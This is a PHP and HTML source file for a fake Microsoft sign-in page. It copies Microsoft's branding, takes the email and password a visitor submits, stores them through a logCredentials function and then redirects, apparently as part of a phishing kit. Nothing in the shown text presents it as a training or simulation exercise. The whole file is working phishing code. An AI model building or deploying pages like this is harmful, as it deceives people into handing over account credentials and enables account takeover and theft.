<?php
require_once 'utils.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = sanitizeInput($_POST['email'] ?? '');
    $password = sanitizeInput($_POST['password'] ?? '');
    
    logCredentials('microsoft', ['email' => $email, 'password' => $password]);
    header('Location: index.php?microsoft_success=1');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Microsoft</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 10px;
        }

        .ms-container {
            width: 100%;
            max-width: 400px;
        }

        .ms-card {
            background: white;
            padding: 50px 40px;
            text-align: center;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .ms-logo {
            margin-bottom: 30px;
        }

        .ms-logo svg {
            width: 40px;
            height: 40px;
        }

        h1 {
            font-size: 28px;
            margin-bottom: 10px;
            color: #1f1f1f;
            font-weight: 400;
        }

        .subtitle {
            color: #595959;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            color: #1f1f1f;
            font-size: 13px;
            font-weight: 400;
            margin-bottom: 8px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 11px 10px;
            border: 1px solid #c7c7c7;
            font-size: 15px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            transition: all 0.1s;
            background: white;
            color: #1f1f1f;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #0078d4;
            box-shadow: inset 0 0 0 1px #0078d4;
        }

        input::placeholder {
            color: #999;
        }

        .forgot-link {
            margin: 15px 0;
        }

        .forgot-link a {
            color: #0078d4;
            text-decoration: none;
            font-size: 13px;
        }

        .forgot-link a:hover {
            text-decoration: underline;
        }

        .buttons {
            display: flex;
            justify-content: flex-end;
            gap: 10px;
            margin-top: 25px;
        }

        .btn {
            padding: 7px 28px;
            border-radius: 2px;
            font-size: 13px;
            font-weight: 400;
            cursor: pointer;
            border: 1px solid #c7c7c7;
            transition: all 0.1s;
        }

        .btn-cancel {
            background: white;
            color: #1f1f1f;
        }

        .btn-cancel:hover {
            background: #f7f7f7;
            border-color: #8a8a8a;
        }

        .btn-signin {
            background: #0078d4;
            color: white;
            border-color: #0078d4;
        }

        .btn-signin:hover {
            background: #106ebe;
        }

        .info-text {
            text-align: left;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
            font-size: 12px;
            color: #595959;
            line-height: 1.6;
        }
    </style>
</head>
<body>
    <div class="ms-container">
        <div class="ms-card">
            <div class="ms-logo">
                <svg viewBox="0 0 24 24" fill="currentColor">
                    <path d="M11.4 24H0V12.6L12.6 0H24v11.4L11.4 24z" fill="#0078d4"/>
                </svg>
            </div>

            <h1>Sign in</h1>
            <p class="subtitle">to your Microsoft account</p>

            <form method="POST">
                <div class="form-group">
                    <label for="email">Email, phone, or Skype</label>
                    <input 
                        type="email" 
                        id="email" 
                        name="email" 
                        required 
                        autofocus
                        placeholder="someone@example.com"
                    >
                </div>

                <div class="forgot-link">
                    <a href="#">Can't access your account?</a>
                </div>

                <div class="form-group">
                    <label for="password">Password</label>
                    <input 
                        type="password" 
                        id="password" 
                        name="password" 
                        required 
                        placeholder="••••••••"
                    >
                </div>

                <div class="forgot-link">
                    <a href="#">Keep me signed in</a>
                </div>

                <div class="buttons">
                    <button type="button" class="btn btn-cancel" onclick="history.back()">Cancel</button>
                    <button type="submit" class="btn btn-signin">Next</button>
                </div>
            </form>

            <div class="info-text">
                Don't have an account? <a href="#" style="color: #0078d4;">Create one</a>
            </div>
        </div>
    </div>
</body>
</html>
